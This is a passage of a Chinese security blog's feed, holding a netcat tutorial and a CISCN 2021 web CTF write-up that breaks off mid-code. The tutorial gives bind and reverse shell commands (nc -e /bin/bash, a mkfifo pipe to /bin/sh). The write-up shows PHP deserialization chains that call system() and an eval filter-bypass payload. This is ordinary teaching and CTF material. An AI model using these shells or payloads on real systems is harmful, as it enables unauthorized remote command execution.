title="fix阶段"></a>fix阶段</h3><p>fix阶段暴露自己一个比较大的短板，就是对javaweb完全不了解，也就导致，对于java的那道题完全无从下手，最后只能对比较熟悉的两道pythonflask题入手，对于web1增加了黑名单内容，几乎把所有可以利用的函数特殊字符都ban了，最后也是这道题过了check。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CISCN2021决赛总结&quot;&gt;&lt;a href=&quot;#CISCN2021决赛总结&quot; class=&quot;headerlink&quot; title=&quot;CISCN2021决赛总结&quot;&gt;&lt;/a&gt;CISCN2021决赛总结&lt;/h1&gt;&lt;p&gt;算是队伍主力师兄全部毕业，加上18级队员相对断层情况</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="总结" scheme="http://www.fxizenta.design/categories/ctf/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="http://www.fxizenta.design/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>nc的简介以及常见使用方法</title>
    <link href="http://www.fxizenta.design/2021/07/11/nc-introudion/"/>
    <id>http://www.fxizenta.design/2021/07/11/nc-introudion/</id>
    <published>2021-07-11T14:04:42.000Z</published>
    <updated>2021-07-23T09:08:15.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nc的简介以及常见使用方法"><a href="#nc的简介以及常见使用方法" class="headerlink" title="nc的简介以及常见使用方法"></a>nc的简介以及常见使用方法</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>nc全名NetCat，有Windows和Linux的版本，因为短小、功能实用，被设计为一个简单、可靠的网络工具，可以通过TCP或UDP协议传输读写数据，同时，他还是一个网络应用DEbug分析器。</p><p>通常Linux发行版中都带有NetCat</p><p>参考连接：<a href="https://blog.csdn.net/zhangxiao93/article/details/52705642">Linux　nc 命令详解_上善若水-CSDN博客_nc命令</a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y nc</span><br><span class="line">rpm -q nc</span><br></pre></td></tr></table></figure><h1 id="参数简介"><a href="#参数简介" class="headerlink" title="参数简介"></a>参数简介</h1><p>语　　法：nc [-hlnruz][-g&lt;网关…&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源地址&gt;][-v…][-w&lt;超时秒数&gt;][主机名称][通信端口…]</p><p>补充说明：执行本指令可设置路由器的相关参数。</p><p>参　　数：</p><ul><li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li><li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li><li>-h 在线帮助。</li><li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li><li>-l 使用监听模式，管控传入的资料。</li><li>-n 直接使用IP地址，而不通过域名服务器。</li><li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li><li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li><li>-r 乱数指定本地与远端主机的通信端口。</li><li>-s&lt;来源地址&gt; 设置本地主机送出数据包的IP地址。</li><li>-u 使用UDP传输协议。</li><li>-v 显示指令执行过程。</li><li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li><li>-z 使用0输入/输出模式，只在扫描通信端口时使用。</li></ul><h1 id="简单使用示例"><a href="#简单使用示例" class="headerlink" title="简单使用示例"></a>简单使用示例</h1><h2 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pc1：nc -l port</span><br><span class="line">pc2：nc ip port </span><br></pre></td></tr></table></figure><h2 id="远程拷贝文件"><a href="#远程拷贝文件" class="headerlink" title="远程拷贝文件"></a>远程拷贝文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pc1</span><br><span class="line">nc -l port &gt; 1234.txt</span><br><span class="line"></span><br><span class="line">pc2</span><br><span class="line">nc -w 1 ip port &lt; abc.txt</span><br></pre></td></tr></table></figure><p>文件由pc2到pc1</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -w 1 ip -z port-port</span><br></pre></td></tr></table></figure><h2 id="保存Web页面"><a href="#保存Web页面" class="headerlink" title="保存Web页面"></a>保存Web页面</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> nc -l -p 80 -q 1 &lt; somepage.html; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="模拟HTTP-Headers"><a href="#模拟HTTP-Headers" class="headerlink" title="模拟HTTP Headers"></a>模拟HTTP Headers</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hatest1 ~]<span class="comment"># nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browser</span></span><br><span class="line">HTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]</span><br></pre></td></tr></table></figure><h1 id="nc命令的使用实例"><a href="#nc命令的使用实例" class="headerlink" title="nc命令的使用实例"></a>nc命令的使用实例</h1><h2 id="加密网络发送的数据"><a href="#加密网络发送的数据" class="headerlink" title="加密网络发送的数据"></a>加密网络发送的数据</h2><p>服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> localhost [port] | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt</span><br></pre></td></tr></table></figure><p>使用mcrypt工具加密数据</p><p>客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mcrypt</span> –flush –bare -F -q -m ecb &lt; file.txt | nc -l [port]</span><br></pre></td></tr></table></figure><p>使用mcrypt工具解密数据</p><p>请确保两端使用相同的密码</p><h2 id="流视频"><a href="#流视频" class="headerlink" title="流视频"></a>流视频</h2><p>首先说明这个不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用nc也可以完成。</p><p>服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat video.avi | nc -l [port]</span><br></pre></td></tr></table></figure><p>这里是从一个视频文件中读入并重定向输出到netcat客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip [port] | mplayer -vo x11 -cache 3000 -</span><br></pre></td></tr></table></figure><h2 id="克隆一个设备"><a href="#克隆一个设备" class="headerlink" title="克隆一个设备"></a>克隆一个设备</h2><p>如果你想配置一个新linux机器，而你不想在重复配置一遍，只需要启动另一台机器的一些引导可以克隆你的机器。</p><p>假设系统在/dev/sda上</p><p>Server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/sda | nc -l [port]</span><br></pre></td></tr></table></figure><p>Client</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -n [ip] [port] | dd of=/dev/sda</span><br></pre></td></tr></table></figure><p>dd是一个从磁盘中读取原始数据的工具，通过nc服务器重定向它的输出流</p><p>到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。</p><h2 id="打开一个shell"><a href="#打开一个shell" class="headerlink" title="打开一个shell"></a>打开一个shell</h2><p>远程shell（例如telnet和ssh）但是如果靶机没有，而且我们没有安装权限也可以使用netcat创建远程shell</p><p>目标机（服务机）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> -l [port] -e /bin/bash -i</span><br></pre></td></tr></table></figure><p>客户机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nc</span> [ip] [port]</span><br></pre></td></tr></table></figure><p>这里我们建立了一个netcat服务器并且表示当它连接成功时执行/bin/bash假如netcat不支持-c或者-e参数时，我们可以使用以下命令建立起远程shell</p><p>目标机（服务机）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/tmp_fifo</span><br><span class="line">cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</span><br></pre></td></tr></table></figure><p>创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt; &amp;1中。是用来重定向标准错误和标准输出，然后管道到netcat运行的端口1567上，至此，我们已经把netcat的输出定向到fifo文件中</p><p><strong>过程详解</strong></p><p>从网路收到的输入写道fifo文件中→cat命令读取fifo文件并且其内容发送给sh命令→sh命令进程受到输入并且把它写回到netcat→netcat网络发送给客户机</p><p>客户机操作同上</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>ctfer常用操作</p><p>服务端端进行监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l [port]</span><br></pre></td></tr></table></figure><p>客户端则在nc连接后执行shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip] [port] -e /bin/bash</span><br></pre></td></tr></table></figure><p>反弹shell常用于绕过防火墙的限制</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nc的简介以及常见使用方法&quot;&gt;&lt;a href=&quot;#nc的简介以及常见使用方法&quot; class=&quot;headerlink&quot; title=&quot;nc的简介以及常见使用方法&quot;&gt;&lt;/a&gt;nc的简介以及常见使用方法&lt;/h1&gt;&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; cla</summary>
      
    
    
    
    <category term="基础学习" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/linux/"/>
    
    
    <category term="linux" scheme="http://www.fxizenta.design/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscn_web华南赛区wp</title>
    <link href="http://www.fxizenta.design/2021/07/10/ciscn2021hn/"/>
    <id>http://www.fxizenta.design/2021/07/10/ciscn2021hn/</id>
    <published>2021-07-10T12:09:43.000Z</published>
    <updated>2021-07-23T09:06:50.795Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN华南赛区分区赛wp"><a href="#CISCN华南赛区分区赛wp" class="headerlink" title="CISCN华南赛区分区赛wp"></a>CISCN华南赛区分区赛wp</h1><p>期末考终于结束了，抓紧来整理一下这次比赛的wp</p><h1 id="easy-seri"><a href="#easy-seri" class="headerlink" title="easy_seri"></a>easy_seri</h1><p>第一步先静态调试过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$public_key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$private_key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$public_key</span> !== <span class="variable">$private_key</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getHint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;./demo.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$a</span>,<span class="string">&#x27;key&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;No!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    unserialize(<span class="variable">$a</span>)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=s:<span class="number">13</span>:<span class="string">&quot;Test::getHint&quot;</span>; gethint</span><br></pre></td></tr></table></figure><p>看其他师傅的wp也可以16进制绕strpos，然后绕wakeup，数组执行getHint（因为unserialize后面还有个括号）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$test</span>-&gt;public_key = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$test</span>-&gt;private_key = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = [<span class="variable">$test</span>, <span class="string">&#x27;getHint&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>然后可以看到demo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fake</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$firm</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$firm</span>,<span class="variable">$test</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;No,You can&#x27;t&quot;</span>;</span><br><span class="line"><span class="variable">$firm</span> = unserialize(<span class="variable">$firm</span>);</span><br><span class="line">call_user_func(<span class="variable">$firm</span>,<span class="variable">$test</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Temp</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$pri</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$fin</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">$this</span>-&gt;action;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;pri-&gt;<span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;fin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OwO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;fc)(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$d</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fake</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$firm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$firm</span>, <span class="variable">$test</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$test</span> = <span class="string">&quot;No,You can&#x27;t&quot;</span>;</span><br><span class="line">        <span class="variable">$firm</span> = unserialize(<span class="variable">$firm</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$firm</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line">        call_user_func(<span class="variable">$firm</span>, <span class="variable">$test</span>); <span class="comment">//OwO run</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Temp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pri</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fin</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;action;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pri-&gt;<span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;fin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OwO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fc</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span> = <span class="string">&quot;id&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;fc)(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a=array(new OwO,&#x27;run&#x27;);</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Temp;</span><br><span class="line"><span class="variable">$a</span>-&gt;pri=<span class="keyword">new</span> Fake;</span><br><span class="line"><span class="variable">$a</span>-&gt;action=<span class="string">&#x27;a:2:&#123;i:0;O:3:&quot;OwO&quot;:2:&#123;s:2:&quot;fc&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:2:&quot;ls&quot;;&#125;i:1;s:3:&quot;run&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="magicchar"><a href="#magicchar" class="headerlink" title="magicchar"></a>magicchar</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span><span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Magic</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;=strlen(<span class="variable">$str</span>)<span class="number">-1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&lt;<span class="number">32</span>) <span class="keyword">or</span> (ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&gt;<span class="number">126</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;sorry&#x27;</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$blklst</span> = [<span class="string">&#x27;[A-VX-Za-z]&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&quot;&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;~&#x27;</span>];</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$blklst</span> <span class="keyword">as</span> <span class="variable">$blkitem</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blkitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;out&#x27;</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yell&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yell&#x27;</span>];</span><br><span class="line">  Magic(<span class="variable">$str</span>);</span><br><span class="line">  ob_start();</span><br><span class="line">  <span class="variable">$res</span> = <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$str</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">  <span class="variable">$out</span> = ob_get_contents();</span><br><span class="line">  ob_end_clean();</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$out</span> === <span class="string">&quot;Wa4nn&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> htmlspecialchars(<span class="variable">$out</span>, ENT_QUOTES);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>套路题</p><p>字符串或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yell=%<span class="number">22</span>W%<span class="number">22.</span>(%<span class="number">22</span>@%<span class="number">22</span>|%<span class="number">22</span>!%<span class="number">22</span>).%<span class="number">224</span>%<span class="number">22.</span>(%<span class="number">22</span>@%<span class="number">22</span>|%<span class="number">22.</span>%<span class="number">22</span>).(%<span class="number">22</span>@%<span class="number">22</span>|%<span class="number">22.</span>%<span class="number">22</span>)</span><br></pre></td></tr></table></figure><h1 id="really-admin"><a href="#really-admin" class="headerlink" title="really_admin"></a><strong>really_admin</strong></h1><p>第一步根据提示直接md5过</p><p>admin/129581926211651571912466741651878684928</p><p>进来之后根据提示去ssrf.php</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt=""></p><p>看到这个熟悉的界面加上上面的慢慢做管理系统的标题</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt="CISCN%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9Bwp%20f1f334862d914c13a0934a194b3ea0be/Untitled%201.png"></p><p>破案了hfctf原题</p><p>直接翻出之前打hfctf的wp，直接打</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 